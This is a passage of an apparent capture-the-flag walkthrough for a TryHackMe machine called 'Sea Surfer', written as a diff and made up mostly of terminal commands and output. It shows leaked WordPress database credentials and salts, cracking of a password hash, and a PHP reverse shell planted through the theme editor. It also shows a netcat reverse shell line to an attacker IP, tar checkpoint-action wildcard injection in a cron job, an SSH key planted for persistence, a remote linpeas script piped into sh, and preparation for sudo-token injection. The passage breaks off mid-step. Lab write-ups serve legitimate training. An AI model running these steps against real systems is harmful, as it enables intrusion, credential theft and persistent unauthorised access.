@@ -383,3 +383,389 @@ Additional information:
 * This file contains the following configurations:
 *
 * * Database settings
+* * Secret keys
+* * Database table prefix
+* * ABSPATH
+*
+* @link https://wordpress.org/support/article/editing-wp-config-php/
+*
+* @package WordPress
+*/
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+/** Database username */
+define( 'DB_USER', 'wordpressuser' );
+/** Database password */
+define( 'DB_PASSWORD', 'coolDataTablesMan' );
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+/**#@+
+* Authentication unique keys and salts.
+*
+* Change these to different unique phrases! You can generate these using
+* the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+*
+* You can change these at any point in time to invalidate all existing cookies.
+* This will force all users to have to log in again.
+*
+* @since 2.6.0
+
+* @since 2.6.0
+*/
+define('AUTH_KEY', 'SFP(>4};J1<~uW@#Z0~&5eJB@{gEzk2(DE_|k1d/B,b*cZLQu0avhmF^!}u| Mv^');
+define('SECURE_AUTH_KEY', '-Z;O^-p6f2S+RWT9`5YT8oh),A5)P]Z9V1g!}*s|OLn@LaTWQd:7(?VPQ38<bK@o');
+define('LOGGED_IN_KEY', '-6g}oyB ]-*IhO<:ln2Hd^K`Tf.kJlbDs$rx6+2cF?x|$~`XyKZANE)EG^Xy2-#6');
+define('NONCE_KEY', '-*847+C`JbNW5:upCc,#pTjgBxS?H-vI{oG@4Xt.AANh|GuJ0nk/8>7fPHj%-;-f');
+define('AUTH_SALT', '4cF?fB2,eGo0]-XiMh-@u`8t|p$YAi@=:}!z<TTF%|Hd#miHV{3{d7!!.1y:WIfE');
+define('SECURE_AUTH_SALT', 't&gahvY+N^--}nk( ]3-@}6%NesVZ%!Q<D8E>1~UE-|;C,(vGbl)q>u$lBcx:-T/');
+define('LOGGED_IN_SALT', '>k$)D6(!K5H&~+GT~UR)0z?4XVOo<G8G)-J!a~U|fHDyd-8.OLJPcFSR2>X+*eU!');
+define('NONCE_SALT', '1Et3q-e44k.NN-U=SEpNnJA/D%O;Ow}`]U!ysu~Qdw6d?CmQw*N2;]W.J-89-@a]');
+/**#@-*/
+/**
+* WordPress database table prefix.
+*
+* You can have multiple installations in one database if you give each
+* a unique prefix. Only numbers, letters, and underscores please!
+*/
+$table_prefix = 'wp_';
+/**
+* For developers: WordPress debugging mode.
+*
+* Change this to true to enable the display of notices during development.
+* It is strongly recommended that plugin and theme developers use WP_DEBUG
+* in their development environments.
+*
+* For information on other constants that can be used for debugging,
+* visit the documentation.
+*
+* @link https://wordpress.org/support/article/debugging-in-wordpress/
+*/
+define( 'WP_DEBUG', false );
+/* Add any custom values between this line and the "stop editing" line. */
+/* That's all, stop editing! Happy publishing. */
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+define( 'ABSPATH', __DIR__ . '/' );
+}
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+then login in /adminer
+
+http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress
+
+http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress&select=wp_users
+
+kyle : $P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/
+
+┌──(witty㉿kali)-[~]
+└─$ cat hash_seasurfer 
+$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/
+
+or just change it :)
+
+┌──(witty㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_seasurfer
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jenny4ever       (?)     
+1g 0:00:00:50 DONE () 0.01980g/s 9930p/s 9930c/s 9930C/s jenny777..jello33
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+
+login
+
+http://seasurfer.thm/wp-admin/?admin_email_remind_later=1
+
+http://seasurfer.thm/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen 
+
+revshell
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tail payload_ivan.php                                           
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1337);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>  
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl http://seasurfer.thm/wp-content/themes/twentyseventeen/404.php
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34810
+SOCKET: Shell has connected! PID: 51185
+which python
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+or
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34812
+SOCKET: Shell has connected! PID: 51218
+python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+```
+```text
+# Press Ctrl+Z
+
+stty raw -echo; fg; reset;
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;
+
+www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ cd /var/www/internal/maintenance
+cd /var/www/internal/maintenance
+www-data@seasurfer:/var/www/internal/maintenance$ ls
+ls
+backup.sh
+www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+```
+```text
+# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
+```
+
+## Exploitation
+```text
+# Still need to come up with a better backup system, perhaps a cloud provider?
+
+cd /var/www/internal/invoices
+tar -zcf /home/kyle/backups/invoices.tgz *
+www-data@seasurfer:/var/www/internal/maintenance$ cd /var/www/internal/invoices
+cd /var/www/internal/invoices
+www-data@seasurfer:/var/www/internal/invoices$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
+www-data@seasurfer:/var/www/internal/invoices$ echo ""> "--checkpoint-action=exec=sh shell.sh"
+echo ""> "--checkpoint-action=exec=sh shell.sh"
+www-data@seasurfer:/var/www/internal/invoices$ echo ""> --checkpoint=1
+echo ""> --checkpoint=1
+www-data@seasurfer:/var/www/internal/invoices$ ls
+ls
+'--checkpoint-action=exec=sh shell.sh'	 10072023-HWjHNv6sJClQVULEFnPb.pdf   10072023-RvZI9uENduweGWtPHu6v.pdf	 10072023-f0614GT3xZCekK4yZRAJ.pdf   18042022-x7nvKzdxwDPtGvg3hexH.pdf
+'--checkpoint=1'			 10072023-HsCTh0PqnMd9rOLH4WGP.pdf   10072023-T3d9gJ27G3JZVqewFHQB.pdf	 10072023-f4PnrVl2qvcUaSRl2Frs.pdf   19042022-P8SghZ3qVclByyfsSm4c.pdf
+ 10072023-4Ba5J6QLzHl4dQrhvoIy.pdf	 10072023-Ixe4izWo5Dgetf8bz8wo.pdf   10072023-TL7NzzolfMeW81zTHPD4.pdf	 10072023-kfEf4vxgqjpZF2Fylfn8.pdf   19042022-RuQkG8SZaxQc6vyw7BCv.pdf
+ 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf	 10072023-MQHDq0QTwIgCF48HJuJX.pdf   10072023-X1J9ntPNub9iUXKREqC6.pdf	 18042022-SZEAfjkefOWOLzNG0nBF.pdf   22042022-NNod4XQ0usiYmPZOVASm.pdf
+ 10072023-6JNx7UZRbtFUmCAz6rrQ.pdf	 10072023-NMhNcqy3YbDUos3yT96F.pdf   10072023-cyuRo7ZJUUMKPPw4yZQb.pdf	 18042022-lUIvPaOVZIJQarZO7wHP.pdf   shell.sh
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 1338
+listening on [any] 1338 ...
+connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 52658
+sh: 0: can't access tty; job control turned off
+```
+```text
+$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+kyle@seasurfer:/var/www/internal/invoices$ 
+zsh: suspended  rlwrap nc -lvp 1338
+                                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ stty raw -echo; fg; reset;
+[1]  + continued  rlwrap nc -lvp 1338
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;
+
+kyle@seasurfer:/var/www/internal/invoices$ cd /home
+cd /home
+kyle@seasurfer:/home$ ls
+ls
+kyle
+kyle@seasurfer:/home$ cd kyle
+cd kyle
+kyle@seasurfer:~$ ls
+ls
+backups  snap  user.txt
+kyle@seasurfer:~$ cat user.txt
+cat user.txt
+THM{SSRFING_TO_LFI_TO_RCE}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mkdir seasurfer              
+                                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd seasurfer  
+
+┌──(witty㉿kali)-[~/Downloads/seasurfer]
+└─$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/witty/.ssh/id_rsa): /home/witty/Downloads/seasurfer/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/witty/Downloads/seasurfer/id_rsa
+Your public key has been saved in /home/witty/Downloads/seasurfer/id_rsa.pub
+The key fingerprint is:
+SHA256:xpdT+HtUeOi3dc4icYa652WE8bkRRs2FVOve28p98tA witty@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|             .o=+|
+|           . ..o+|
+|          . o =.o|
+|       .   + B.= |
+|        S + = X.+|
+|       . . o B.B=|
+|          . o BoE|
+|           ..*.++|
+|          .o. o==|
++----[SHA256]-----+
+
+┌──(witty㉿kali)-[~/Downloads/seasurfer]
+└─$ cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali
+
+kyle@seasurfer:~$ ls -lah
+ls -lah
+total 48K
+drwxr-x--- 7 kyle kyle     4.0K Apr 22  2022 .
+drwxr-xr-x 3 root root     4.0K Apr 16  2022 ..
+drwxrwxr-x 2 kyle kyle     4.0K Apr 19  2022 backups
+lrwxrwxrwx 1 kyle kyle        9 Apr 18  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 kyle kyle      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 kyle kyle     3.7K Feb 25  2020 .bashrc
+drwx------ 3 kyle kyle     4.0K Apr 17  2022 .cache
+drwxrwxr-x 3 kyle kyle     4.0K Apr 17  2022 .local
+-rw-r--r-- 1 kyle kyle      807 Feb 25  2020 .profile
+-rw-rw-r-- 1 kyle www-data   66 Apr 17  2022 .selected_editor
+drwx------ 3 kyle kyle     4.0K Apr 18  2022 snap
+drwx------ 2 kyle kyle     4.0K Apr 17  2022 .ssh
+-rw-r--r-- 1 kyle kyle        0 Apr 16  2022 .sudo_as_admin_successful
+-rw-rw-r-- 1 kyle kyle       27 Apr 18  2022 user.txt
+kyle@seasurfer:~$ cd .ssh
+cd .ssh
+kyle@seasurfer:~/.ssh$ ls
+ls
+authorized_keys
+kyle@seasurfer:~/.ssh$ cat authorized_keys
+cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer
+
+kyle@seasurfer:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali" >> authorized_keys 
+
+┌──(witty㉿kali)-[~/Downloads/seasurfer]
+└─$ ssh -i id_rsa kyle@10.10.74.111
+The authenticity of host '10.10.74.111 (10.10.74.111)' can't be established.
+ED25519 key fingerprint is SHA256:4ChmQCQ0tIG/wbF2YLD8+ZdmJVvA1bFzIRVLwXXrs0g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.74.111' (ED25519) to the list of known hosts.
+
+  ___ ___   _     ___ _   _ ___ ___ ___ ___ 
+ / __| __| /_\   / __| | | | _ \ __| __| _ \
+ \__ \ _| / _ \  \__ \ |_| |   / _|| _||   /
+ |___/___/_/ \_\ |___/\___/|_|_\_| |___|_|_\
+                                            
+
+Last login: Mon Jul 10 22:02:10 2023 from 127.0.0.1
+kyle@seasurfer:~$ id
+uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)
+
+linpeas on the fly
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.74.111 - - [10/Jul/2023 19:39:20] "GET /linpeas.sh HTTP/1.1" 200 -
+
+kyle@seasurfer:~$ cd /tmp
+kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/linpeas.sh -O - |sh |tee -a linpeas.txt
+--  http://10.8.19.103:1234/linpeas.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘STDOUT’
+
+We all noticed that sometimes sudo doesn't ask us for a password because he remembers us. How does he remember us and how does he identifies us? Can we falsify our identity and become root?
+
+`sudo` creates a file for each linux user in `/var/run/sudo/ts/[username]`. These files contain both successful and failed authentications, then sudo uses these files to remember all the authenticated processes.
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
+ptrace protection is disabled (0)
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+
+`kyle` have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password
+
+kyle@seasurfer:/tmp$ whoami
+kyle
+kyle@seasurfer:/tmp$ ps faux |grep sudo |grep ^`whoami`
+kyle        1125  0.0  0.1   6892  2324 pts/0    Ss+  22:02   0:00  \_ bash -c sudo /root/admincheck; sleep infinity
+kyle       96988  0.0  0.0   6300   724 pts/4    S+   23:48   0:00              \_ grep --color=auto sudo
+kyle@seasurfer:/tmp$ cat /proc/sys/kernel/yama/ptrace_scope
+0
+
+`ptrace protection` as disabled
+
+- `ptrace` is a very aptly named **Linux** system call and a debugging tool which allows to observe and _trace_ how a _process_ runs in the operating system
+- However, this can be abused, since many processes contain secrets and sensitive information (such as `sudo` tokens)
+- **Yama** is a **Linux Security Module** that aims to fix this by setting a scope for the processes that can be observed with `ptrace`
+- If the **Yama** `ptrace_scope` is set to **0**, the protection is disabled, which allows the observation of all processes
+
+https://github.com/nongiach/sudo_inject
+
+We need the `gdb` program, which is a debugger for `C`, to be able to use the `ptrace` system call properly.
+
+kyle@seasurfer:/tmp$ grep -v "^#" /etc/apt/sources.list
+deb http://fi.archive.ubuntu.com/ubuntu focal main restricted
+
+deb http://fi.archive.ubuntu.com/ubuntu focal-updates main restricted
+
+deb http://fi.archive.ubuntu.com/ubuntu focal universe
+deb http://fi.archive.ubuntu.com/ubuntu focal-updates universe
+
+deb http://fi.archive.ubuntu.com/ubuntu focal multiverse
+deb http://fi.archive.ubuntu.com/ubuntu focal-updates multiverse
+
+deb http://fi.archive.ubuntu.com/ubuntu focal-backports main restricted universe multiverse
+
+deb http://fi.archive.ubuntu.com/ubuntu focal-security main restricted
+deb http://fi.archive.ubuntu.com/ubuntu focal-security universe
+deb http://fi.archive.ubuntu.com/ubuntu focal-security multiverse
+
+Here, we can't install `gdb` using `sudo apt install gdb`, as we don't know `kyle`'s password to run `sudo`. Therefore, we could instead download the [`.deb` package, which actually is an archive file](https://en.wikipedia.org/wiki/Deb_(file_format))
+
+Debian packages are standard Unix ar archives that include two tar archives. One archive holds the control information and another contains the installable data.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb -O gdb.deb
+--  http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb
+Resolving fi.archive.ubuntu.com (fi.archive.ubuntu.com)... 193.166.3.5, 2001:708:10:8::5
+Connecting to fi.archive.ubuntu.com (fi.archive.ubuntu.com)|193.166.3.5|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3218448 (3.1M) [application/x-debian-package]
+Saving to: ‘gdb.deb’
+
+gdb.deb        0%       0  --.-KB/sgdb.deb        0%  21.73K   105KB/sgdb.deb        1%  50.09K   120KB/sgdb.deb        3% 106.81K   170KB/sgdb.deb        7% 220.25K   263KB/sgdb.deb       14% 447.12K   428KB/sgdb.deb       28% 895.13K   713KB/sgdb.deb       50%   1.55M  1.04MB/sgdb.deb      100%   3.07M  1.93MB/s    in 1.6s    
+
+(1.93 MB/s) - ‘gdb.deb’ saved [3218448/3218448]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ar x gdb.deb
+                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ xz -d data.tar.xz && tar xvf data.tar
+./
+./etc/
+./etc/gdb/
+./etc/gdb/gdbinit
+./usr/
+./usr/bin/
